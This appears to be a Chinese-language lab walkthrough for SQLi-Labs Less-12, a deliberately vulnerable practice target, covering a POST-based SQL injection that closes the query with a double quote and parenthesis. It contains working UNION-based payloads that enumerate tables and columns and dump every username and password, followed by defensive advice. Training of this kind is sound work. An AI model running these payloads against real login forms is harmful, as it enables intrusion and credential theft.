## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：在 POST 登录框中，识别出双引号+右括号 `")` 的闭合方式，利用 UNION 联合查询爆出数据。

## 二、大白话原理讲解
上一关，柜员（数据库）的锁孔是单引号（`'`）。这一关，他不仅把锁孔换成了**双引号（`"`）**，还在外面加了一道**小括号**。

我们在提交用户名的时候，如果只递给他一个双引号，他会因为括号没闭合而直接报错。但是他的报错声（报错信息）会提示我们：“你少了一个括号！”
于是，我们把双引号和右括号一起递给他（`")`），并且用注释符（`--+`）把后面的门堵死。门一开，剩下的套路就和上一关完全一样了。

## 三、解题步骤

**1. 抓包与测注入点**
使用 Burp Suite 或 HackBar 抓取 POST 登录请求：
`uname=admin&passwd=123&submit=Submit`

将 `uname` 改为 `admin"`，页面报错：
`You have an error in your SQL syntax; ... near '"1") LIMIT 0,1' at line 1`
**分析**：报错信息 `near` 后面出现了 `")`，说明后台 SQL 语句是类似 `SELECT * FROM users WHERE username=("$uname") AND password=...`。闭合方式为 `")`。

**2. 确认列数（ORDER BY）**
在 `uname` 中测试：
```text
uname=-1") order by 2 --+&passwd=123&submit=Submit
```
（如果 2 正常，3 报错，说明查询结果有 2 列）

**3. 寻找回显点（UNION SELECT）**
```text
uname=-1") union select 1,2 --+&passwd=123&submit=Submit
```
**结论**：页面回显了 `1` 和 `2`，说明这两个位置可以控制。

**4. 爆库、爆表、爆数据**
直接把查询内容替换到 `uname` 参数中：

*   **查库名**：
```text
uname=-1") union select 1,database() --+&passwd=123&submit=Submit
```
（回显库名：`security`）

*   **查表名**：
```text
uname=-1") union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+&passwd=123&submit=Submit
```

*   **查字段名**：
```text
uname=-1") union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=123&submit=Submit
```

*   **终极拖库**：
```text
uname=-1") union select 1,group_concat(username,0x3a,password) from users --+&passwd=123&submit=Submit
```

**5. 验证结果**
页面回显了 `Your Password:Dumb:Dumb,Angelina:I-kill-you...` 等所有账号密码，页面底部显示 `SUCCESSFULLY`，成功通关。

## 四、知识点解析
1. **POST + 括号变形注入**：与 GET 注入的逻辑完全一致，只是参数传递位置变成了请求体，并且闭合字符需要根据报错信息调整为 `")`。
2. **报错信息观察**：在尝试注入时，单双引号和括号的组合是排查闭合方式的唯一线索。观察 `near` 后的内容至关重要。
3. **注释符的妙用**：`--+` 在 POST 请求中同样有效（在 URL 编码后空格变为 `+`），用于注释掉原 SQL 语句中多余的 `AND password=...` 及 `LIMIT`。

## 五、总结与防御
**本题总结**：
Less-12 就是将 Less-3 的 GET 注入换成了 POST 形式，并换成了双引号闭合。只要学会了举一反三，通过报错信息确认 `")` 闭合，后续的 UNION 联合查询就是肌肉记忆。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：使用参数化查询，彻底阻断注入。
- **统一错误回显**：生产环境关闭详细的 SQL 报错，不要给攻击者任何关于闭合方式的提示。
